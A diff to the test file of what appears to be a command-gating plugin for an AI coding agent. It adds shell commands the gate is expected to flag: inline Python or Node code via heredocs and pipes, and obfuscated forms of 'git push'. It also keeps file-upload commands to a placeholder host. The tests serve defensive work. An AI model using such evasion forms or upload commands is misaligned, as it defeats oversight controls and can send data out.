@@ -366,6 +366,13 @@ describe("opencode chat gate plugin", () => {
         "curl -T f http://x",
         "wget --post-data=a http://x",
         "echo 'git push' | bash",
+        "python3 - <<'PY'\nimport subprocess\nPY",
+        "node <<'EOF'\nrequire('child_process')\nEOF",
+        "echo 'import os' | python3",
+        "python3 < x.py",
+        "git \\\npush origin main",
+        "g''it push origin main",
+        "$GIT push origin main",
       ]) {
         const r = verdict("shell", { command });
         expect(
@@ -379,6 +386,7 @@ describe("opencode chat gate plugin", () => {
         "curl -X GET http://x",
         "wget http://x",
         "python3 script.py",
+        "node --version",
         "cat > /tmp/n.md <<'EOF'\n`code` $(x)\nEOF",
       ]) {
         const r = verdict("shell", { command });
